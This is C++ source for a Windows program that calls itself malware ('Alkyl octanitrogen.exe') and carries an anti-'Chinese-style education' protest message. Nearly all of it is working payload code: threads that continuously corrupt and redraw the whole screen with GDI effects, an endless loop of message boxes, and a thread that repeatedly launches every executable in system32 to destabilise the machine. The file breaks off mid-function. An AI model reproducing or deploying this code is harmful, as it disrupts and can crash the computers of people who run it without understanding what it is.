﻿//Alkyl octanitrogen.exe: a malware about anti-Chinese style education.
#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<windowsx.h>
#include<math.h>
#include<stdlib.h>
#include<time.h>
#include<conio.h>
#include<tchar.h>
#include<windef.h>
#include<fstream>
#include<cstdlib>
#include<memory>
#include<iosfwd>
#include<string>
#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define RGBBRUSH (DWORD)0x1900ac010e
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!(write by pankoza)
	//And I Get It To Pankoza's Oxymorphazone source code.cpp(write by coder-linjian)

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
COLORREF Hue(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
DWORD xs;
void Seedxorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD xorshift32() {
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}
DWORD WINAPI msg(LPVOID lpvd) 
{
	while (true)
	{
		MessageBoxW(NULL, L"Chinese style education has caused us a great deal of pressure.\r\n\What we need is not pressure and oppression, but freedom.\r\n\Each of us has the right to freedom.\r\n\The pressure from school and assignments from teachers even drive some students to suicide,or suddenly die in the examination hall.\r\n\We in China have over a billion people, and if Chinese style education continues to develop, even more people will suffer from it.\r\n\Our ancestors once said, 'Teach according to one's ability,' but all of this is undermined by our high school and university entrance exams.\r\n\This is a common problem for us, yet more people are still following the trend of implementing Chinese-style education.\r\n\If we can curb this so-called Chinese-style education, we will be able to cultivate more talent that has no pressure.", L"Alkyl octanitrogen.exe--anti-Chinese style education word", MB_OK | MB_ICONINFORMATION);
	}
	return 0;

}
DWORD WINAPI randsystem32program(LPVOID lpParam)//credits to N17Pro3426
{
	HANDLE FirstFileW; // esi
	int v2; // eax
	struct _WIN32_FIND_DATAW FindFileData; // [esp+10h] [ebp-258h] BYREF

	while (true)
	{
		do
		{
			FirstFileW = FindFirstFileW(L"C:\\WINDOWS\\system32\\*.exe", &FindFileData);
			ShellExecuteW(0, L"open", FindFileData.cFileName, 0, 0, 5);
		} while (!FindNextFileW(FirstFileW, &FindFileData));
		do
		{
			ShellExecuteW(0, L"open", FindFileData.cFileName, 0, 0, 5);
			v2 = rand();
			Sleep(v2 % 5000);
		} while (FindNextFileW(FirstFileW, &FindFileData));
	}
}
VOID WINAPI ci(int x, int y, int w, int h) {
	HDC hdc = GetDC(0);
	HRGN hrgn = CreateEllipticRgn(x, y, w + x, h + y);
	SelectClipRgn(hdc, hrgn);
	HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
	SelectObject(hdc, hBrush);
	BitBlt(hdc, x, y, w, h, hdc, x, y, PATINVERT);
	ReleaseDC(0, hdc);
	DeleteObject(hrgn); DeleteObject(hBrush);
}
DWORD WINAPI circle(LPVOID lpParam) {
	srand(time(NULL));
	while (true) {
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		int size = 400 + ((1 + rand() % 14) * 100);
		int x = rand() % (w + size) - size / 2, y = rand() % (h + size) - size / 2;
		for (int i = 0; i < size; i += 100) {
			ci(x - i / 2, y - i / 2, i, i);
			Sleep(5);
		}
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI ballz(LPVOID lpParam) {
	int radius = 18;
	int numCircles = 140;
	int cx = 150, cy = 150;
	int dx = 8, dy = 8;
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);

		for (int i = 0; i < numCircles; i++) {
			int spiralRadius = i * 0.85;
			int x = cx + spiralRadius * cos(i * 0.5);
			int y = cy + spiralRadius * sin(i * 0.5);

			HBRUSH brush = CreateSolidBrush(Hue(239));
			SelectObject(hdc, brush);

			Ellipse(hdc, x - radius, y - radius, x + radius, y + radius);

			DeleteObject(brush);
		}

		cx += dx;
		cy += dy;

		if (cx + radius > w || cx - radius < 0) dx = -dx;
		if (cy + radius > h || cy - radius < 0) dy = -dy;

		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI squarez(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int wdpi = GetDeviceCaps(hdc, LOGPIXELSX);
	int hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	for (;;) {
		for (int x = 0; x <= w; x += 64) {
			SelectObject(hdc, CreateSolidBrush(RGB(255 - (rand() % 255), rand() % 255, (rand() % 129) * 2)));
			PatBlt(hdc, x, 0, 64, h, PATINVERT);
			Sleep(100);
		}
		for (int y = 0; y <= h; y += 64) {
			SelectObject(hdc, CreateSolidBrush(RGB((rand() % 65) * 4, rand() % 255, (rand() % 33) * 8)));
			SelectObject(hdc, CreatePen(PS_NULL, 0, NULL));
			Rectangle(hdc, 0, y, w, y + 65);
			Sleep(100);
		}
	}
}
DWORD WINAPI icon1(LPVOID lpParam) {//credits to pankoza, but i modified it.
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	int xf = 0;
	int yf = 0;
	int signX = 15;
	int signY = 5;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int radius = 100.0f;
	double angle = 0;
	int x, y;
	int centerX, centerY;
	int origX = (w / 4) - (radius / 2), origY = (h / 4) - (radius / 2);
	CURSORINFO cur;
	while (1) {
		HDC hdc = GetDC(HWND_DESKTOP);
		xf += signX;
		yf += signY;
		centerX = origX - (w / 4), centerY = origY - (h / 4);
		x = (sin(angle) * radius) + centerX, y = (cos(angle) * radius) + centerY;
		int icon_x = GetSystemMetrics(SM_CXICON);
		int icon_y = GetSystemMetrics(SM_CYICON);
		GetCursorInfo(&cur);

		for (INT i = 64; i > 8; i -= 8) {
			DrawIconEx(hdc, (50 + x - i + xf) - icon_x, (50 + y - i + yf) - icon_y, LoadCursor(0, IDC_SIZEWE), 7 * GetSystemMetrics(SM_CXICON), 7 * GetSystemMetrics(SM_CYICON), 0, NULL, DI_NORMAL);
		}
		angle = fmod(angle + PI / radius, PI * radius);

		if (yf == 0)
		{
			signY = 5;
		}

		if (xf == 0)
		{
			signX = 15;
		}

		if (yf >= GetSystemMetrics(1))
		{
			signY -= 5;
		}

		if (xf >= GetSystemMetrics(0))
		{
			signX -= 15;
		}
		ReleaseDC(0, hdc);
		Sleep(10);
	}
	return(1);
}
DWORD WINAPI icon2(LPVOID lpParam) {
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc;
	HICON shifang;
	while (true) {
		HICON shifang = LoadCursor(0, IDC_APPSTARTING);
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		DestroyIcon(shifang);
		DeleteObject(shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_ARROW);
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		DestroyIcon(shifang);
		DeleteObject(shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_CROSS);
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		DestroyIcon(shifang);
		DeleteObject(shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_HELP);
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		DestroyIcon(shifang);
		DeleteObject(shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_IBEAM);
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		DestroyIcon(shifang);
		DeleteObject(shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_NO);
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		DestroyIcon(shifang);
		DeleteObject(shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_WAIT);
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		DestroyIcon(shifang);
		DeleteObject(shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_SIZENWSE);
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		DestroyIcon(shifang);
		DeleteObject(shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_SIZENESW);
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		DestroyIcon(shifang);
		DeleteObject(shifang);
		Sleep(20);
		shifang = LoadCursor(0, IDC_UPARROW);
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		DestroyIcon(shifang);
		DeleteObject(shifang);
		Sleep(20);
		shifang = LoadIcon(0, IDI_WARNING);
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		DestroyIcon(shifang);
		DeleteObject(shifang);
		Sleep(20);
		shifang = LoadIcon(0, IDI_QUESTION);
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		DestroyIcon(shifang);
		DeleteObject(shifang);
		Sleep(20);
		shifang = LoadIcon(0, IDI_APPLICATION);
		hdc = GetDC(0);
		DrawIconEx(hdc, rand() % w, rand() % h, shifang, 100, 100, NULL, NULL, DI_NORMAL);
		ReleaseDC(0, hdc);
		DestroyIcon(shifang);
		DeleteObject(shifang);
		Sleep(20);
	}
}
DWORD WINAPI gradientfilltriangle(LPVOID lpvd)//credits to pankoza
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);


	while (1)
	{
		hdc = GetDC(NULL);
		// Create an array of TRIVERTEX structures that describe
		// positional and color values for each vertex.
		TRIVERTEX vertex[3];
		vertex[0].x = rand() % w;
		vertex[0].y = rand() % h;
		vertex[0].Red = 0xbf00;
		vertex[0].Green = 0xff00;
		vertex[0].Blue = 0x0000;
		vertex[0].Alpha = 0x0000;

		vertex[1].x = rand() % w;
		vertex[1].y = rand() % h;
		vertex[1].Red = 0xf000;
		vertex[1].Green = 0xb000;
		vertex[1].Blue = 0x9000;
		vertex[1].Alpha = 0x0000;

		vertex[2].x = rand() % w;
		vertex[2].y = rand() % h;
		vertex[2].Red = 0xfb00;
		vertex[2].Green = 0xb800;
		vertex[2].Blue = 0x0000;
		vertex[2].Alpha = 0x0000;

		// Create a GRADIENT_TRIANGLE structure that
		// references the TRIVERTEX vertices.
		GRADIENT_TRIANGLE gTriangle;
		gTriangle.Vertex1 = 0;
		gTriangle.Vertex2 = 1;
		gTriangle.Vertex3 = 2;

		// Draw a shaded triangle.
		GradientFill(hdc, vertex, 3, &gTriangle, 1, GRADIENT_FILL_TRIANGLE);
		ReleaseDC(0, hdc);
		Sleep(1);
	}

	return 0x00;
}
DWORD WINAPI bitblt1(LPVOID lpParam) {
	int count = 0;
	while (true)
	{
		int w = GetSystemMetrics(SM_CXSCREEN);
		int h = GetSystemMetrics(SM_CYSCREEN);
		int a = rand() % w, b = rand() % h;
		HDC hdc = GetDC(NULL);
		BitBlt(hdc, a, b, 200, 200, hdc, a + rand() % 21 - 10, b + rand() % 21 - 10, SRCCOPY);
		ReleaseDC(NULL, hdc);
		if (count == 30) {
			count = 0;
			Sleep(1);
		}
		else {
			count++;
		}
	}
	return 0;
}
DWORD WINAPI bitblt2(LPVOID lpvd)//credits to pankoza
{
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, SRCCOPY);
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(1);
	}
}
DWORD WINAPI bitblt3(LPVOID lpParam) {
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, DSTINVERT);
		BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, SRCCOPY);
		BitBlt(hdc, rand() % w, rand() % h, w, h, hdc, rand() % w, rand() % h, MERGEPAINT);
		Sleep(15);
	}
	ReleaseDC(NULL, hdc);
}
DWORD WINAPI bitblt4(LPVOID lpParam)
{
	while (1) {
		HDC hdc = GetDC(0);
		int x = GetSystemMetrics(0);
		int y = GetSystemMetrics(1);
		BitBlt(hdc, rand() % 12, rand() % 12, x, y, hdc, rand() % 12, rand() % 12, NOTSRCCOPY);
		ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI bitblt5(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		BitBlt(hdc, 0, 0, w, h, hdc, -30, 0, 0x1900ac010e);
		BitBlt(hdc, 0, 0, w, h, hdc, w - 30, 0, 0x1900ac010e);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, -30, 0x1900ac010e);
		BitBlt(hdc, 0, 0, w, h, hdc, 0, h - 30, 0x1900ac010e);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI bitblt6(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	for (;;)
	{
		BitBlt(hdc, 2, 2, w / 2, h / 2, hdc, 0, 0, SRCPAINT);
		BitBlt(hdc, (w / 2) - 2, 2, w / 2, h / 2, hdc, w / 2, 0, SRCPAINT);
		BitBlt(hdc, 2, (h / 2) - 2, w / 2, h / 2, hdc, 0, h / 2, SRCPAINT);
		BitBlt(hdc, (w / 2) - 2, (h / 2) - 2, w / 2, h / 2, hdc, w / 2, h / 2, SRCPAINT);
		Sleep(50);
	}
}
DWORD WINAPI patblt1(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	while (true)
	{
		HBRUSH brush = CreateSolidBrush(RndRGB);
		SelectObject(hdc, brush);
		PatBlt(hdc, 0, 0, rand() % x, rand() % y, PATINVERT);
		DeleteObject(brush);
		ReleaseDC(GetDesktopWindow(), hdc);
		DeleteDC(hdc);
		Sleep(10);
	}
}
DWORD WINAPI stretchblt1(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int sw = GetSystemMetrics(0);
		int sh = GetSystemMetrics(1);
		SetStretchBltMode(hdc, HALFTONE);
		StretchBlt(hdc, 1, 1, sw + 2, sh + 2, hdc, 0, 0, sw, sh, SRCCOPY);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI mixblt1(LPVOID lpParam) {
	int block_w = 80, block_h = 80;
	while (true) {
		int can1 = 1;
		int jia1 = 0, jia2 = 0, x = 0; int y = 0;
		int x1 = 0, y1 = 0, x2 = 0, y2 = 0;
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BOOL bianliang1 = true;
		while (bianliang1) {
			jia1 = jia1 + block_w;
			if (jia1 > w) { bianliang1 = false; }
			else { can1 = can1 + 1; }
		}
		can1 = can1 + 1; bianliang1 = true;
		int can2 = 1;
		while (bianliang1) {
			jia2 = jia2 + block_h;
			if (jia2 > h) { bianliang1 = false; }
			else { can2 = can2 + 1; }
		}
		can2 = can2 + 1;
		HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int jin = 0; jin < can2 + 1; jin++) {
			for (int gui = 0; gui < can1 + 1; gui++) {
				x = rand() % can1, y = jin;
				if (x == 1) { x1 = 0; }
				else if (x == 2) { x1 = block_w; }
				else { x1 = block_w * x - block_w; }

				if (y == 1) { y1 = 0; }
				else if (y == 2) { y1 = block_h; }
				else { y1 = block_h * y - block_h; }

				x = rand() % can1, y = rand() % can2;
				if (x == 1) { x2 = 0; }
				else if (x == 2) { x2 = block_w; }
				else { x2 = block_w * x - 1; }

				if (y == 1) { y2 = 0; }
				else if (y == 2) { y2 = block_h; }
				else { y2 = block_h * y - 1; }

				StretchBlt(hcdc, x1, y1, block_w, block_h, hcdc, x2, y2, block_w, block_h, SRCCOPY);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		jia1 = 0, jia2 = 0, can1 = 0, can2 = 0;
		Sleep(500);
	}
	return 0;
}
DWORD WINAPI mixblt2(LPVOID lpParam) {
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	while (1) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		StretchBlt(hcdc, 1, 0, w, h, hcdc, 0, 0, w, h, SRCINVERT);
		StretchBlt(hcdc, 0, 1, w, h, hcdc, 0, 0, w, h, SRCINVERT);
		StretchBlt(hcdc, -1, 0, w, h, hcdc, 0, 0, w, h, SRCINVERT);
		StretchBlt(hcdc, 0, -1, w, h, hcdc, 0, 0, w, h, SRCINVERT);
		HBRUSH hBrush = CreateSolidBrush(RndRGB);
		SelectObject(hcdc, hBrush);
		PatBlt(hcdc, 0, 0, w, h, PATINVERT);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteObject(hBrush);
		DeleteDC(hcdc);
		DeleteDC(hdc);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI mixblt3(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		Seedxorshift32(__rdtsc());
		desk = GetDC(0);
		SelectObject(desk, CreateHatchBrush(rand() % 7, RndRGB));
		Ellipse(desk, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
		Rectangle(desk, rand() % sw, rand() % sh, rand() % sw, rand() % sh);
		BitBlt(desk, rand() % 10, rand() % 10, sw, sh, desk, rand() % 10, rand() % 10, 0x2837E28);
		Sleep(20);
		if (rand() % 35 == 5) InvalidateRect(0, 0, 0);
	}
}
DWORD WINAPI mixblt4(LPVOID lpParam) {
	srand(time(NULL));
	int mode = 2;
	int block_w = 240;
	int block_h = 240;
	while (true) {
		int can1 = 1;
		int jia1 = 0; int jia2 = 0;
		int x; int y;
		int x1 = 0; int y1 = 0;
		int x2 = 0; int y2 = 0;
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		BOOL bianliang1 = true;
		while (bianliang1) {
			jia1 = jia1 + block_w;
			if (jia1 > w) {
				bianliang1 = false;
			}
			else {
				can1 = can1 + 1;
			}
		}
		can1 = can1 + 1;
		bianliang1 = true;
		int can2 = 1;
		while (bianliang1) {
			jia2 = jia2 + block_h;
			if (jia2 > h) {
				bianliang1 = false;
			}
			else {
				can2 = can2 + 1;
			}
		}
		can2 = can2 + 1;
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < can2 + 1; i++) {
			for (int k = 0; k < can1 + 1; k++) {
				x = rand() % can1;
				y = i;
				if (x == 1) {
					x1 = 0;
				}
				else if (x == 2) {
					x1 = block_w;
				}
				else {
					x1 = block_w * x - block_w;
				}

				if (y == 1) {
					y1 = 0;
				}
				else if (y == 2) {
					y1 = block_h;
				}
				else {
					y1 = block_h * y - block_h;
				}

				x = rand() % can1;
				y = rand() % can2;
				if (x == 1) {
					x2 = 0;
				}
				else if (x == 2) {
					x2 = block_w;
				}
				else {
					x2 = block_w * x - 1;
				}

				if (y == 1) {
					y2 = 0;
				}
				else if (y == 2) {
					y2 = block_h;
				}
				else {
					y2 = block_h * y - 1;
				}

				StretchBlt(hcdc, x1, y1, block_w, block_h, hdc, x2, y2, block_w, block_h, SRCCOPY);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		jia1 = 0; jia2 = 0;
		can1 = 0;
		can2 = 0;
		if (mode == 1) {
			block_w += 1;
			block_h += 1;
		}
		else {
			block_w -= 1;
			block_h -= 1;
		}

		if (block_w < 40) {
			mode = 1;
		}
		else if (block_w > 240) {
			mode = 2;
		}
		else if (block_w == 240) {
			mode = 2;
		}
		Sleep(1);
	}
}
DWORD WINAPI mixblt5(LPVOID lpParam) {
	while (true) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < h; i++) {
			StretchBlt(hcdc, -2 + (rand() % 5), i, w, 1, hcdc, 0, i, w, 1, SRCCOPY);
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(10);
	}
	return 0;
}
DWORD WINAPI text1(LPVOID lpvd) //credits to pankoza
{
	int x = GetSystemMetrics(0);
	int y = GetSystemMetrics(1);
	LPCSTR text0 = 0;
	LPCSTR text1 = 0;
	LPCSTR text2 = 0;
	LPCSTR text3 = 0;
	LPCSTR text4 = 0;
	LPCSTR text5 = 0;
	LPCSTR text6 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text0 = "Alkyl octanigrogen.exe";
		text1 = "Anti-Chinese style education";
		text2 = "We need freedom, not pressure!";
		text3 = "No imposing excessive punishments on the students.";
		text4 = "Everyone has the right to freedom.";
		text5 = "We swear we will not be exploited as labour!";
		text6 = "nobody likes pressure and oppression";
		SetTextColor(hdc, RndRGB);
		HFONT font = CreateFontA(rand() % 100, rand() % 100, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Times New Roman");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text0, strlen(text0));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
		Sleep(10);
		TextOutA(hdc, rand() % x, rand() % y, text6, strlen(text6));
		Sleep(10);
		DeleteObject(font);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI text2(LPVOID lpParam)//credits to N17Pro3426's yesgntgfrf.exe
{
	HDC hdc;
	LPCWSTR text1 = L"I used to be a happy person, growing up without pressure.";
	LPCWSTR text2 = L"Now that I am exposed to Chinese-style education, I have to face a lot of homework and pressure.";
	LPCWSTR text3 = L"I don't understand why Chinese style education makes us compete and overwork ourselves, we have the right not to do so.";
	LPCWSTR text4 = L"Now, I am tormented by Chinese style education, not knowing how I can continue to live under these circumstances.";

    while (true)
	{
		hdc = GetWindowDC(GetDesktopWindow());
		SetBkColor(hdc, RndRGB);
		SetTextColor(hdc, RndRGB);
		TextOutW(hdc, 25, 25, text1, wcslen(text1));
		TextOutW(hdc, 25, 50, text2, wcslen(text2));
